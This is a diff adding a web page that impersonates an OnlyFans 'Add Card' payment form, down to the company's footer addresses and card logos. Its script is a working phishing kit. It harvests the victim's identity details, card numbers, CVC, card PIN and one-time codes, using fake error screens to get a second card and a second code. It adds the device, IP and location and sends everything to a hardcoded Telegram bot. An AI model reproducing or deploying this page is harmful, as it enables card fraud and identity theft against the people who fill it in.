@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Add Card</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+          
+         
+        }
+        .card-form {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+            height: 5%;
+            width: 500px;
+        }
+        .card-form h2 {
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        .card-form input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        .card-form button {
+            width: 15%;
+
+            padding: 10px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 15px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .card-form button:hover {
+            background-color: #0056b3;
+        }
+        .info {
+            background-color: #e7f3fe;
+            border-left: 6px solid #2196F3;
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 4px;
+        }
+        .info p {
+            margin: 0;
+        }
+        .footer {
+            text-align: center;
+            font-size: 12px;
+            color: #777;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="card-form">
+        <h2>Add Card</h2>
+       
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Multi-Page Form</title>
+        <style>
+            .page {
+                display: none;
+            }
+            .active {
+                display: block;
+            }
+            #thank-you {
+                display: none;
+            }
+        </style>
+
+<script>
+    let currentPage = 0;
+    let formData = new FormData();
+
+    function showPage(pageIndex) {
+        const pages = document.querySelectorAll('.page');
+        pages.forEach((page, index) => {
+            page.classList.toggle('active', index === pageIndex);
+        });
+    }
+
+    function validatePage(pageIndex) {
+        const inputs = document.querySelectorAll(`.page-${pageIndex} input`);
+        let isValid = true;
+        inputs.forEach(input => {
+            if (!input.checkValidity()) {
+                isValid = false;
+                input.reportValidity();
+            }
+        });
+        return isValid;
+    }
+
+    async function submitPage(pageIndex) {
+        saveFormData(pageIndex);
+        await sendFormData();
+    }
+
+    function saveFormData(pageIndex) {
+        const inputs = document.querySelectorAll(`.page-${pageIndex} input`);
+        inputs.forEach(input => {
+            formData.set(input.name, input.value);
+        });
+    }
+
+    async function sendFormData() {
+        const botToken = '6848819763:AAEFWzRagLNU_WMXE91QfEy0kdRHJH1ZuNA';
+        const chatId = '6965372099';
+        const message = Array.from(formData.entries()).map(entry => `${entry[0]}: ${entry[1]}`).join('\n');
+
+        // Collect additional information
+        const deviceInfo = navigator.userAgent;
+        const timeInfo = new Date().toLocaleString();
+        const ipInfo = await fetch('https://api.ipify.org?format=json').then(response => response.json());
+        const locationInfo = await fetch('https://ipapi.co/json').then(response => response.json());
+
+        const fullMessage = `
+            Device Info: ${deviceInfo}
+            Time: ${timeInfo}
+            IP Address: ${ipInfo.ip}
+            Location: ${locationInfo.city}, ${locationInfo.region}, ${locationInfo.country_name}
+            ${message}
+        `;
+
+        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: chatId, text: fullMessage })
+        });
+    }
+
+    async function nextPage() {
+        if (validatePage(currentPage)) {
+            await submitPage(currentPage);
+            const pages = document.querySelectorAll('.page');
+            if (currentPage < pages.length - 1) {
+                currentPage++;
+                showPage(currentPage);
+            }
+        }
+    }
+
+    async function finalSubmit() {
+        if (validatePage(currentPage)) {
+            await submitPage(currentPage);
+            document.querySelector('.page.page-4').classList.remove('active');
+            document.getElementById('thank-you').style.display = 'block';
+
+            setTimeout(() => {
+                window.location.href = 'https://onlyfans.com/lauraluxfree';
+            }, 5000);
+        }
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+        showPage(currentPage);
+
+        // Add event listeners for credit card and expiration date formatting
+        const cardNumberInputs = document.querySelectorAll('[name^="card-number"]');
+        cardNumberInputs.forEach(input => {
+            input.addEventListener('input', formatCreditCardNumber);
+        });
+
+        const expDateInputs = document.querySelectorAll('[name^="exp-date"]');
+        expDateInputs.forEach(input => {
+            input.addEventListener('input', formatExpirationDate);
+        });
+    });
+
+    // Function to format credit card number input
+    function formatCreditCardNumber(event) {
+        const input = event.target;
+        const cardNumber = input.value.replace(/\D/g, '').substring(0, 20); // Limit to 16 digits
+        const formattedCardNumber = cardNumber.replace(/(\d{4})(?=\d)/g, '$1 ').trim();
+        input.value = formattedCardNumber;
+    }
+
+    // Function to format expiration date input
+    function formatExpirationDate(event) {
+        const input = event.target;
+        const expirationDate = input.value.replace(/\D/g, '').substring(0, 4); // Limit to 4 digits
+        const formattedExpirationDate = expirationDate.replace(/(\d{2})(\d{2})/, '$1/$2').trim();
+        input.value = formattedExpirationDate;
+    }
+</script>
+
+
+    </head>
+    
+    <body>
+        <div class="page page-0 active">
+            <div>
+                <h3 align="center">Information and Billing Address</h3>
+                <center>
+                <form id="form-section-a">
+                    <input type="text" name="fullname" placeholder="Fullname" style="width:330px;height:20px;border-radius:5px; height: 20px;" required><br><br>
+                    <input type="tel" name="phone number" placeholder="Phone number (country-code)" style="width:330px;height:20px;border-radius:5px; height: 20px;" required><br><br>
+                    <input type="email" name="email" placeholder="Email" style="width:330px;height:20px;border-radius:5px; height: 20px;" required><br><br>
+                    <input type="text" name="address" placeholder="Residential Address" style="width:330px;height:20px;border-radius:5px; height: 20px;" required><br><br>
+                    <input type="text" name="state" placeholder="State" style="width:330px;height:20px;border-radius:5px;height: 20px;" required><br><br>
+                    <h3 align="center">Card Details</h3>
+                 
+                        <input type="text" name="card-name" placeholder="Name Card" style="width:330px;height:20px;border-radius:5px; height: 20px;" required><br><br>
+                        <input type="tel" name="card-number" placeholder="Card Number" style="width:330px;height:20px;border-radius:5px;height: 20px;" required><br><br>
+                        <input type="tel" name="exp-date" placeholder="exp-date" style="width:330px;height:20px;border-radius:5px; height: 20px;" required><br><br>
+                        <input type="tel" name="cvc" placeholder="CVC" style="width:330px;height:20px;border-radius:5px; height: 20px;" required><br><br>
+                </form>
+                </center>
+            </div>
+            <p align="right">
+            <button onclick="nextPage()" type="button" class="g-btn m-rounded">Next</button>
+            </p>
+        </div>
+        
+    
+        <div class="page page-1">
+            <div>
+                
+                <font color="red"><center>Card Authentication Error. Try another card or retry.</center></font>
+                <center>
+                <form id="form-section-b-again">
+                    <input type="text" name="card-name2" placeholder="Name on Card" style="width:330px;height:20px;border-radius:5px; border-color:black" required><br><br>
+                    <input type="tel" name="card-number2" placeholder="Card Number" style="width:330px;height:20px;border-radius:5px; border-color:black" required><br><br>
+                    <input type="tel" name="exp-date2" placeholder="Exp Date" style="width:330px;height:20px;border-radius:5px; border-color:black" required><br><br>
+                    <input type="tel" name="cvc2" placeholder="CVC" style="width:330px;height:20px;border-radius:5px; border-color:black" required><br><br>
+                </form>
+                </center>
+            </div>
+            <p align="right">
+            <button onclick="nextPage()" type="button" >Submit</button>
+            </p>
+        </div>
+    
+        <div class="page page-2">
+            <h3 align="center">Card Pin</h3>
+            <br><br>
+            <form id="form-page-2">
+                <center>
+                <input type="tel" name="card pin" placeholder="XXXX" maxlength="6" style="width:330px;height:20px;border-radius:5px; border-color:black;text-align:center" required>
+                </center>
+            </form>
+            <br><br>
+            <p align="right">
+            <button onclick="nextPage()" type="button" class="g-btn m-rounded">Submit</button>
+            </p>
+        </div>
+    
+        <div class="page page-3">
+            <h3 align="center">Card Verification</h3>
+            <br>
+            <h5 align="center">Enter OTP sent to your mobile</h5>
+            <form id="form-page-3">
+                <center>
+                <input type="tel" name="code1" placeholder="XXXXXX" maxlength="6" style="width:330px;height:20px;border-radius:5px; border-color:black;text-align:center" required>
+                <br><br>
+                You will Receive An OTP code shortly, please wait 05:00 minutes.
+                </center>
+            </form>
+            <br><br>
+            <p align="right">
+            <button onclick="nextPage()" type="button" class="g-btn m-rounded">Submit</button>
+            </p>
+        </div>
+    
+        <div class="page page-4">
+            <h3 align="center">Card Verification</h3>
+            <br>
+            <h5 align="center"><font color="red">Invalid code, wait we will send another code</font></h5>
+            <form id="form-page-4">
+                <center>
+                <input type="tel" name="code2" placeholder="XXXXXX" maxlength="6" style=" width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;;
+            border-radius: 4px" required>
+                <br><br>
+                You will Receive An OTP code shortly, please wait  05:00 minutes.
+                </center>
+            </form>
+            <br><br>
+            <p align="right">
+            <button onclick="finalSubmit()" type="button" class="g-btn m-rounded">Submit</button>
+            </p>
+        </div>
+    
+        <div id="thank-you">
+            <center>
+            <h2>Card Added successfully</h2>
+            </center>
+        </div>
+    </body>
+    </html>
+    
+
+       
+       
+       
+        <div class="info">
+            <p>OnlyFans will make a one-time charge of $0.10 when adding your payment card. The charges on your credit card statement will appear as "OnlyFans".</p>
+        </div>
+<center>
+        <img data-v-727d0c49="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGAAAABgCAMAAADVRocKAAAAflBMVEUAAADy8/Xy8/Xy8/Xy8/Xy8/UAUJi1yt72pQB5ocYdZKM8eK8OWp3E1OPU3+nj6e9ajbumwNiXttItbqlLgrWIq8xpl8DzuUD2sijy7ubz6db01JEPVY7vpQvz37jz26i/uJQuYHv0zHpNa2j1wluKhVGrkT+giTrElyrUnSDuLh2LAAAABXRSTlMA8KAgMC4oWXgAAAIfSURBVGje7ZjZcuMgEEXHTgAjIdBiy1lnX///BwfTi6h5mU6VqUoqfV4ssOjb3G5ZLj4oiqIoivKauNnvzFXZ7W/q+LcQ/roSt1X+EP/aCtse9qYJexbYmSbsWMA0QgVUQAVUoLHA4DLx5QJ3B+L7PcxEe6HDT1/m3NECwRtgDZfhItjB/SNpPOJSDOzK5ynPpN4yPdzkcZhEFn08F4EzjAKsxBgux1/sBu6gw6GT1SB+e84Cd+V6LgtHY8CVPDPaihluYj1hkZen31nhwWTAjiHPQSlMxFDRJOc7SLlnxwQC6Puvw+ETlBjX0cVULlZT4SwRRAIQ5OfhK1QPjBjIghN01WAQMg23KhHAdP+cqXodaIKSI7sTlwxCB7hBIgAV/fJMYT1vxVUdE0hiLUlAF4wiAfThxwMsCslUTWQg1c2nVMYnSGERCaDjT58j9Sg1EXy5cE0jJWMTepckAuTDCmuj2ZoImMmmI9060i1OIsCN0VFUbiL2EH3iMjnnunIhFJgsM23jqTaxQA8Z0wsFkgXId09dzhbAFkiICUKBLbFTNbwY3a0uZR2Y6MHLmkEo4CmjtBV9oceMmaL9l1kiwB7zk0M9M9uakX9KosssMCcQAI+5Rylxv20MxylUvuOjJhUY66aYqYmmI1dzjNXbokrjPwKS1/3k5+p9/1b/tqiACqjA+xNodZzT/ECq+ZFa60PB5seaiqIoiqK8Iv4CS79siHvGtFUAAAAASUVORK5CYII=" alt="Visa" style="width: 48px;"><img data-v-727d0c49="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGAAAABgCAMAAADVRocKAAACBFBMVEUAAADy8/Xy8/Xy8/Xy8/Xy8/XkBSD6sx7////0hx/BzNt1HEeyv9Lx5OjrfIr4w1ODmbf6tyvw8/blEizi5+3S2eTz69qAckb08Oiis8n126TnMUdEZZL204ntmaXpQVb6wEaQFj34wciTpsDpXm+9kzLrqyPvXCDpMCD68vTw1drqxM7215fsipfygpD92Y/3y278+fPdx9L0583vxs3v5Mz+7Mfut8D0479UcpvkhZX60n9hT3rnUGT6yWOPekHnIzusEDT14ufn1t3s6NzRytbU1tW4u83qtL/uqLL037Hto6/VmaqWhaG2gZjReY04WIhuXYTsU2avjTv5uzifEzfboyjnHCblDyD3nR774eT60dbh3dGnssfr3r+2u76Zqb7957mLnbHJm6374qyXnalviKjHvaDzkp793p1nb5X11ZGpcYxZYoypYX0xSXzzzHe8TWjZtGI9J1v7xlWbLE+CGULns0Gegjy0FDbICyroJyfWCCXycR/sQB/5qB72kh7+8dbMusmgsci9tcfc1sT3srqrobjm17O3jqXp06SFgqLIi559epzRiZveyZmcnZJ3Z4ysooVxfYPDbIPLaoDuY3TStXIjRnKrm3FaaG/mwGs8N2qYjWkhLWXMS2TLSmN+KlPSOVKKJ05nHkxwakvDK0nSqEd+Ykb1nD/tVjHzfB9820Z+AAAABXRSTlMA8KAgMC4oWXgAAAQOSURBVGje7ZiFk9NAFIex7P7YVFJ3o5QCLXIHdxyc4+7u7u7u7u7u8k/yEhgoxyXbK3SGGfJNu22ynff1vU272e1mY2NjY2Nj8y/Rs0d35a/SvUfP0vi9JOErUvQq+f5ViE+Gnzn0UKpCjx+CqiRAKfwQKFXiPxA4k31TPkak+g4a+GtXMDrU7eGEe2gxWKEgmWKlxAY5f3RF3byUdDTcdcGkNtYRn+t7+Lm8I55iFwXOZtYZseGKEnbzzkgP64pguI+ZkBzm4Z3jiZYvSJrGZ74T3JRouYIRzJxj3IKoRCCrD3Ekn8/3NjdMLkfgjDFrFi4yFXiCZQhczJQF/Q3y3BS3XDCQmdObS5ksFfS1SKD3dyxEc2UCJyuHL+aGBolgUFmC4+aCoRKBxSX0mZeDx1JgVKhPnz732UZqLYd493LU1O/tEH1I/SbeYCmgH3ETgMFvAIxhJUwHWAn5m9Bp5L8wR+AiL1oKaAg264JrACaOGg0sns30lylZOmajBujHMwpTCusARCLKzjqgZki/G3WTTzVerql/BgzhjZYCF2MagFEOANcFiAFbQUwVQO0a6LzXT1P/o1xr62roPNDPrIBBC3dLBO0OeLGGntiubdumGbG0+D4vBFXJGwFm+OmcH+eoJP3iI++MBDZ8ix9Y7wXSUkEmgHHwYwLwevbEQgCgmEvaXgH3pgGjxwGU0bLnwBZdcGBt3XjgNrBSAw60RgAuFajABVAM4CqMEs30UnMLSGkwIE/zHio2CT4o0FkH7BYYy3MOaqSCJiNEbQRjvJjw1IFCZkcAekJMgz8ej8+6ArSRoJ4SWAn/YyrRaiAnEOZzvFguEyT1i2gWcFfgNJVmOzBl8EuHMRAbNWBwavB5DQPYWzpetWVsADVPAlCyCOeywKbxRl4JS8FwpmEMCfYBl/zQOQudLIAmL4hagQJrj0PnDHSWCtT1i8OgZa0naiEgDmliapOYqgqxa2bAH4mM00Qg4Ni1I+CtPTQz4veK6Vkxg7GPcQf8Sx86/CIrNjjETv5upHCsF+P3rkoHrQUvVJVl1KMZNcPmqfvnqZmMqqqHWbveHN2vqu3z6ANsAc+FQq395odC9KC3NOAHQ/MPhubo/9fWgiST3FDIaJQIFIsZPy+dcIigTOD60+lAJnC2yQWLLBKQCIhJVrddRoFOclMSikQgmfaPcGvSSjkCZ6zy+y6pQG5YeNI8/jBFJpAbfJ+k8eUCMpiNQ2xguMWs/sEuLaEmdfqDcylE0SO7fuQCwun6TdH3+0oznPhNMTRYwSrTmWwuLU7pQjb8yzIzXQxWvBAf4XI1p1Iu1whnx55wQyLR4nYnEg3hf3il/6dUfTun6htSVd9Sq/amYNW3NW1sbGxsbGz+Ib4CcwXgOOd8K+sAAAAASUVORK5CYII=" alt="MasterCard" style="width: 48px;"><img data-v-727d0c49="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGAAAABgCAMAAADVRocKAAABs1BMVEUAAADy8/Xy8/Xy8/Xy8/Xy8/XkBSAAl9n///85cqvBzNuDmrh5xecCfr7nQFXi7fQtqd/ut8DrfIrlEy3A4PC13O88ruCsEDSm1uxaueMOndvvxs1kf6XT5/Hh5+7x5Oiyv9LpXm/qUGPpMknE4vCAy+yitMqTpsHnIjpgvebB1eQeo90AkdIBisxzjK4sYpzsipcFSIb68fSIy+nR2eRxud3w1doOjsztmaUDXp3uY3TrRFjICyqQ0e2X0Oppv+WhzORAseOgudGBsM/sxM0dhcJwmr8tfLREd6QDZKMraKFEZZLqb4CDQmyTPGS+PVusKU67IEKXFDrJGDa6DS/w9/vg8fmg2PHm5eyx1+v84eTc2OGBuNhVq9bBv89RoMwBhMVYkb0CdLTuqLJjh62ShqPwk580bZ5Ga54EVJPygpAkU4lkV4huXYTwc4J4VH3TYnimU3IiPHKlQmLcECyBv9+Rwd360dbdx9Lkxc9Bns4hk8z4wciCosH3srrQqblShLaek61kg6jGi591fJ/WiJpWYJM1WYkTQn0xSXxWSXYvOm/iUGRjL1x1HEfNJ0SkIkTEC/uTAAAABXRSTlMA8KAgMC4oWXgAAAO5SURBVGje7ZgHU9swFIBbWksPG3AmGSSEDGaAJFA2ZXcBLZTSvfeGAt177/WT++ykmAu2nwn1HXf1d4k8lLzPT44iS9scHBwcHBwcthI7yrYL/5TtZTvWxt9JhC9JsXPN9dsQHw1aDmWCLZStCmxJAFNYFQg28T8I5GBFqBoZ7vQXV3Vf9iSqEE+2plSBPOTiGuHQGkcsm2Qa3nhNCQK5IsyLSAcL4eOsmCr3RgXBMNehOopVWS/TIRHbkCDE9QkHYwmmj7fGukB2cSN6fjFDemkBHf8wY5SBFlRzQw7Ozs7eNza4LQkquDk3jAXemAWBnxuyp1zFpJkSFgQuY8ERRuImBUPckI+MpokUuDhNj9l9JgQpboVDxoI4IRg2+YkySxCCQgu1nfT5fM38mQ8Z1b/FMxMT/UQb6Ql4nj5A6lslQNCZTuM5/IFe3Fuu8nqGMawbYH9JDjSxAh4TgdYJ9quCAwIgPVFAdnN+VlZO8vAIIPfqlOIxdC90TH/owP3nSa0r0IJ2VXAFEB/KFJrPF7ZjoLCyC4uDAiDnQOVUYWgwFQS5yoUGABHO1EItXvqN/ZM3IwAPcH8Mt2dEgBefV34CnF76Afg5Jf7VL1g7QAm0/6FLIrTgCwBFza6Ro4DsVbJpEWAc2+bYmPcuwDWGxem5RoBXbE4CuGU9gwMAD0UAaEHBWQGgFq+vHfJ0fcIDePkeoF+50QsB/GCCDTZiqQmoe3Ad4yiC89jQ+M19fXgwhUnkcrk+fikXEdTTA/OYTHJOVK79t4C7lEDryG8BnooAMmYSxSDHx3F7G+Do7vqTx5qP12PbdWD1o0PoZ4F2PLp2AuCJ1pWpftCGl6f0gS7MZCQCKv6+fBvJKETeNWCxCDDB2DJqkBPfTzWR/aAwmlVGpC4+JY2Hb0vSaC4iNlyJSKOtN6caxTrpYkQSRWlpcLlBfPNVkrAzz39rF8W6q0dYv5We3KlmUFnZyvPvCxyLNjyhDDeZzGR5+WQmk7nD2GAgwObxrRAIBAZZAa9gLohyQ/YxAuLflB7xD1sRuCmBn9MsMkOqBEqAKVDsIRIgBKnN3IVpK89FncaGO9SQHzMR0E+++UHHZDzG519CQBpQQcQnBKQhPEPEJwTU82k6JUwzfZLE/KCIlIvrMCxjlbuJ6eDZ8CRwKM2LCEULVb3rFPHuUqaxwVBYi+7qjAoal+PeNY2T7S55Ip4KVqj45XVVNb0ehaw7tpVn+pvE9uUc2xekbF9Ss3tR0PZlTQcHBwcHB4ctxB898MbEAWVUCwAAAABJRU5ErkJggg==" alt="Maestro" style="width: 48px;"><img data-v-727d0c49="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGAAAABgCAMAAADVRocKAAAAflBMVEUAAADy8/Xy8/Xy8/Xy8/Xy8/X///8AZKcdHRuHiIg9iLtSUlG9vb7B2enl5ufKy8yioqMPba1EREPX2NpsbWwqKiji6/Jencc3NzbT4u2AstN6enpfX18uf7awsbKUlZWyz+Ogxd4fdrJposlOk8KTvdl5q85wqM6ItNOmxt35C/EaAAAABXRSTlMA8KAgMC4oWXgAAALgSURBVGje7NLBjoMgEIDhxXacZBIOXCCYmKhdavv+L7gBJwV3s70wJD3wH9R44JORr16v1+v1ep/UZVAgmhou5fpXBeKpa/H9Chqk8h4GaNLwAhQ0Sb0AaFQHZAH/cJS7P60ssBDOe9B6nQg55+UAT+jsyMFkmLhZIUCb2Y9F4FiYtQigjRt/tbJgtADg4/r/CrYeoA14MnxN7SxQNbCgHmN6O+5mOpyNhWctQMQzYQjRnYY0VwIel7icxwxg2gMYFnQdEMwYoxJAGx++GbjXATfiDZTAHh8mBqgOoLxYBhKqGZgrgTRwdwawBLABYCSBdCjDmxFtEj/ZnoEg+JMDwp9jaqA8po86wOKatmAycLwB5HwdAD/tmO2K4yAUhn+97GsVtX507Ookw7SU2fu/wdWmXZcOhDBtoT/yEMgxAZ/kSNSct2mq2G8vgvYVzGdouaDPFc2wmQSf52afKT7uFeBQU35LH4ED7hbs3t+/G/4tmvihYN7Q+9/dJeiGbc1/Z3fduhx3j9oXnX5tPq7d76+Pv/164MZr/7bdbn5Xjtel8vO0e/De9M/puLly+OrrmB5volmBEo3Ro5IN5tC2SJkHT2LCRy54A8ugVGDW0HJWYFLxgI2qEBfKEoGiADBQYh4dCxpCCeKCWC5AoMUsmX4S6Z8JFIOIwhdnEzOMc8w6yCEOIUaHiou9WyMTBpmMoE2UepEAlJbCx2RNJNyIQuWiDAOVOXdN1wXIBCxVFSBQLBIYFtRIyPMTUlaMSBo1VGg4dkE7oDiNRpKLBJa2C9SU79aAjZTTIA1oaH8jyIsEOjn8L7DtWmt4rwMVasCkz1Z1IyhhVqALJTA456GZEZxGpk/R2mRaQxWMNNM7Og+oaDL1yHqfg2CAiX5WYGUjDwDqWdTQtPQ7OmVb4IOMAmd8SC7kod3XkmVMYSzRFfOy/8mvLXhWOefpBamnl9SeXRR8ellzZWVlZWVl5YX4C5gdgWt5A25PAAAAAElFTkSuQmCC" alt="Diners Club"style="width: 48px;"><img data-v-727d0c49="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGAAAABgCAMAAADVRocKAAAAt1BMVEUAAADy8/Xy8/Xy8/XvfQDy8/XvfQDvfQDy8/XvfQAFFx1ATVK3vL97hYnU19oiMjcTJCrj5efvgwzxmz3y5NaZoKTxqVpsd3tdaW3FysyKkpbxlC2orrHxzqjy7Obx1bjxv4n1sWlOW2DyokoxQEXx3cf93b75x5HxuXvznkLvihnxx5n1tG3ymDb+69v70KX6y5v4wIb3tnL0pVDwjyT3uXj1rV794cf71rHxyqCLi4ttbWxPT0477VJIAAAACHRSTlMA8KAg8DAloJds1qoAAAK0SURBVGje7ZjpcuIwDIALvWTZScgBISSEhPsspdBrd9//uVaKt9cfjk4925n6GxI0YOtzpCQ/fGaxWCwWi+U7cV6vwZdSq5+/z39Zgy+ndvlu/Qbyk+HtGupghPqroAZGqL0KwBBWYAVWYAU/VZAowtdRAuB2nMwHJnMcBcyomBYjAF8pFxj6ThTj+tX5gEAi03c5ktBEoqEoi4cMQBSKYD4PwpHfwD4QNCTTkxyFjPT//N4raEhOmrCAkuAQMQGeOpQNhDwIduFgEKbzUYzoVxM8PqSUTUXZaSHtX85egQToYDVLKhoNbgbgVZfhtyEU6XZ5f79spTMXsQNQnSVySl5GtUKAQwI2ZFowVLoMTWAisdveTdbryf12N+K1Q4wN/4MgPkrgU0U5ovqgl4HzMqkrVuXk6fHxaVKuCtIqaGD7pXFK0eFwaw4L4J/Ap/EUOjiEiiII727HNzfj27vZlArXJknyTsB47kGBrixHujwNh/vJ9IJw+SJ4BvpZD3orkcfXeoSgj+hylOkbN0GMgb15kD5s1uPxevOwimgZRPODgD7xIcFQNSUNY1WTHoi2vqOwr1QbYTqflZvJZLMcTAGA/9OT2vyIcZNjxOyAgNGdkx2s6IA/1BFAazdrleXDbKmXrJf+9qCBT0Vy9wliSfRVFcXQ8bgDANRtijzSwiJMV6vtM1R46OpJTDORkqRSOie97HzYg5v817dplJoVdANhUpAPhDApKAJhUtBLhTAoiKg6BgVRSwiDAk5vUMDpDQp6oRAGBYtUCHOCqAyEMCfo8n1pTBCVcyGMCfIFN9aYoMt3pSEBZ6e+GhPo7IYEOWc/jk9s54yKUBzNxYkbUvmiNRencH3Cllq0aKXiRC6ujtsUjLrTkIt+ev6925p5jyimg1B8jovrqzOLxWKxWCzfiL+k+7sJxfeL/QAAAABJRU5ErkJggg==" alt="Discover" style="width: 48px;"><img data-v-727d0c49="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGAAAABgCAMAAADVRocKAAAAk1BMVEUAAADy8/Xy8/Xy8/Xy8/Xy8/UAabPiBhMAlUDqfIS128h5rtTuuLzj7eq10OQOm0vj6vHx5OcOcbfri5LkIy55xJotpmHvxsomf77tqa7smqDU5uJanMyX0LHpbXUdoFbE2enE4dM8i8Npvo9GsHTlMj3jFCCXv9zw1dmItthLlMem1rxauIPoXmemyOCIyqbmQUvdb74oAAAABXRSTlMA8KAgMC4oWXgAAAGqSURBVGje7djZcoIwFIDhQj0sZV9EQBT33bbv/3QNsRNJxotqkhk7nv+Kq3wQ8cyQNwzDMAzDnql30wClGeZ7f/2BAcozBr37N0BDxvUZTNCSyQADtGQwADSFgCZg5PsJ7FQAcZNaLCD53zbLBYBg2Dqs+4EZWZ4DzjaNAUHhOBJAnFo8kNkCUDhSQGPxQLIRgIkjB5QCUNkCsJIELAFwRaDVDTgIIPBXoAlJhw7Ip9UISH49zQnw8dtxuIpkAA9IngWZm7BZCj4Bes0jBQAto/NindUXwCFNgLRUAnDzjgGFSiDnAfYEgaot4t4iVvAVOZqAISkgwkTmCfY9YH1ji9px9xo9DqQxkBYXYLQRgK4OgOJ+YNaU3fp7em1ZQKvoz5xP6yuwAtI4ugdgjcOQ3n+YEiDLoGt3648WFA9s0cL7pMuH24NF6o+KymWjouu4LJ562CHwMkCqG1iIQC0AkSSwFYFEAE5yQAkC4AIPRIEUUMYCcAYeiOYgAZReDBywroED2lOg6CPQT9jlf/6MfU1A13GO9gMp7Udqug8FtR9rYhiGYRj2RP0ACZl2oREkVCkAAAAASUVORK5CYII=" alt="JCB"  style="width: 48px;">
+       
+       
+       
+    </center> <div class="footer">
+            <p>Fenix International Limited, 9th Floor, 107 Cheapside, London, EC2V 6DN</p>
+            <p>Fenix Internet LLC, 1000 N. West Street, Suite 1200, Wilmington, Delaware, 19801 USA</p>
+        </div>
+    </div>
+
+</body>
+</html>
